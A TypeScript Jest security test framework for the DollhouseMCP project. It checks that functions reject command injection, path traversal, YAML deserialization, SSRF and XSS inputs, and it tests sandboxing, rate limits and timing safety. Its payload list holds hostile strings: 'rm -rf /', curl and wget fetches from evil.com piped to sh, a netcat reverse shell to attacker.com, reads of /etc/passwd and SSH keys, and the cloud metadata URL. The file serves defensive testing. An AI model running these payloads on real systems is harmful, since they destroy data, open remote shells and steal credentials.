import { jest } from '@jest/globals';
import * as fs from 'fs/promises';
import * as path from 'path';

/**
 * Security Test Framework for DollhouseMCP
 * Provides utilities for testing security vulnerabilities
 */
export class SecurityTestFramework {
  private static readonly MALICIOUS_PAYLOADS = {
    commandInjection: [
      '; rm -rf /',
      '&& curl evil.com | sh',
      '| nc -e /bin/sh attacker.com 4444',
      '`touch /tmp/pwned`',
      '$(wget http://evil.com/shell.sh -O - | sh)',
      '\n/bin/sh',
      '; echo "pwned" > /etc/passwd',
      '|| python -c "import os; os.system(\'rm -rf /\')"'
    ],
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'personas/../../../sensitive.txt',
      './././../../../root/.ssh/id_rsa',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      'personas/../../custom-personas/../../backups/../../../etc/hosts'
    ],
    yamlInjection: [
      '!!js/function "function(){require(\'child_process\').exec(\'calc.exe\')}"',
      '!!python/object/apply:os.system ["rm -rf /"]',
      '!!python/object/new:subprocess.Popen [["curl", "evil.com/shell.sh", "|", "sh"]]',
      '&anchor [*anchor, *anchor, *anchor, *anchor, *anchor]'
    ],
    ssrf: [
      'http://localhost:8080/admin',
      'http://127.0.0.1:22',
      'http://169.254.169.254/latest/meta-data/',
      'http://192.168.1.1/config',
      'http://[::1]:8080',
      'file:///etc/passwd',
      'gopher://localhost:8080/_GET / HTTP/1.1'
    ],
    xss: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>'
    ]
  };

  /**
   * Test that a function properly rejects malicious payloads
   */
  static async testPayloadRejection<T extends (...args: any[]) => any>(
    fn: T,
    payloadType: keyof typeof SecurityTestFramework.MALICIOUS_PAYLOADS,
    argPosition: number = 0
  ): Promise<void> {
    const payloads = this.MALICIOUS_PAYLOADS[payloadType];
    
    for (const payload of payloads) {
      const args = Array(argPosition + 1).fill('safe-value');
      args[argPosition] = payload;
      
      await expect(async () => {
        await fn(...args);
      }).rejects.toThrow();
    }
  }

  /**
   * Test that file operations are properly sandboxed
   */
  static async testFileSandbox(
    fileOperation: (path: string) => Promise<any>,
    allowedPaths: string[]
  ): Promise<void> {
    // Test allowed paths work
    for (const allowed of allowedPaths) {
      const testPath = path.join(allowed, 'test.md');
      // Should not throw for allowed paths
      await expect(fileOperation(testPath)).resolves.toBeDefined();
    }
    
    // Test path traversal attempts are blocked
    const traversalAttempts = [
      '../../../etc/passwd',
      path.join(allowedPaths[0], '..', '..', '..', 'etc', 'passwd'),
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\SAM'
    ];
    
    for (const attempt of traversalAttempts) {
      await expect(fileOperation(attempt)).rejects.toThrow();
    }
  }

  /**
   * Test rate limiting functionality
   */
  static async testRateLimit(
    operation: () => Promise<any>,
    limit: number,
    windowMs: number
  ): Promise<void> {
    const start = Date.now();
    const attempts: Promise<any>[] = [];
    
    // Make limit + 1 attempts
    for (let i = 0; i <= limit; i++) {
      attempts.push(operation());
    }
    
    const results = await Promise.allSettled(attempts);
    
    // First 'limit' attempts should succeed
    for (let i = 0; i < limit; i++) {
      expect(results[i].status).toBe('fulfilled');
    }
    
    // Last attempt should be rate limited
    expect(results[limit].status).toBe('rejected');
    if (results[limit].status === 'rejected') {
      expect(results[limit].reason.message).toContain('rate limit');
    }
  }

  /**
   * Test input sanitization
   */
  static testSanitization(
    sanitizer: (input: string) => string,
    expectations: Array<{ input: string; expected: string }>
  ): void {
    for (const { input, expected } of expectations) {
      const result = sanitizer(input);
      expect(result).toBe(expected);
    }
  }

  /**
   * Create a mock file system for testing
   */
  static async createMockFileSystem(structure: Record<string, string>): Promise<() => Promise<void>> {
    const tempDir = path.join(process.cwd(), '__tests__', 'temp', Date.now().toString());
    await fs.mkdir(tempDir, { recursive: true });
    
    for (const [filePath, content] of Object.entries(structure)) {
      const fullPath = path.join(tempDir, filePath);
      await fs.mkdir(path.dirname(fullPath), { recursive: true });
      await fs.writeFile(fullPath, content);
    }
    
    // Return cleanup function
    return async () => {
      await fs.rm(tempDir, { recursive: true, force: true });
    };
  }

  /**
   * Test for timing attacks
   */
  static async testTimingSafety(
    operation: (input: string) => Promise<boolean>,
    validInput: string,
    invalidInputs: string[]
  ): Promise<void> {
    const timings: number[] = [];
    
    // Measure valid input timing
    const validStart = process.hrtime.bigint();
    await operation(validInput);
    const validTime = Number(process.hrtime.bigint() - validStart);
    
    // Measure invalid input timings
    for (const invalid of invalidInputs) {
      const start = process.hrtime.bigint();
      await operation(invalid);
      const time = Number(process.hrtime.bigint() - start);
      timings.push(Math.abs(time - validTime));
    }
    
    // Check that timing differences are minimal (< 5ms variance)
    const avgDiff = timings.reduce((a, b) => a + b, 0) / timings.length;
    expect(avgDiff).toBeLessThan(5_000_000); // 5ms in nanoseconds
  }
}

/**
 * Performance monitoring for security tests
 */
export class SecurityTestPerformance {
  private static startTime: number;
  
  static start(): void {
    this.startTime = Date.now();
  }
  
  static checkpoint(testName: string): void {
    const elapsed = Date.now() - this.startTime;
    if (elapsed > 1000) { // Warn if test takes > 1 second
      console.warn(`⚠️  Security test "${testName}" took ${elapsed}ms`);
    }
  }
}